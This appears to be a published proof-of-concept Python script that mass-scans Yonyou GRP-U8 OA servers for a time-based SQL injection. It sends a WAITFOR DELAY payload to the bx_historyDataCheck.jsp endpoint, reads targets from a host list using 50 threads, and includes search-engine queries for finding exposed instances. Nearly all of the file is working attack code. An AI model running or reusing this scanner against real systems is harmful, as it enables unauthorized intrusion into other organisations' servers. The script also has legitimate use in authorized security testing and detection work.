#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# fofa：app="yonyou-GRP-U8"
# hunter：app.name="用友GRP-U8 OA"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor
import time

if len(sys.argv) != 2:
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                       +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                     +')
    print(
        '+ EXP: python3 Yongyou_Grp_U8_bx_historyDataCheck_Sql_Poc.py url.txt                                      +')
    print(
        '+---------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host":"%s" % host2,
        "Connection": "close",
    }
    data="userName=';WAITFOR DELAY '0:0:5'--&ysnd=&historyFlag="
    vulurl = url + "/u8qx/bx_historyDataCheck.jsp"
    try:
        start_time = time.time()
        r = requests.post(vulurl, headers=headers,data=data)
        end_time = time.time()
        response_time = end_time - start_time
        if r.status_code==200 and response_time >5 and response_time<6 :
            print(host+" :true 延时注入时间:"+str(response_time)[:6]+"s")
        else:
            return 0
            print (host+":false")
    except:
        return 0
        print (host+":false")


if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])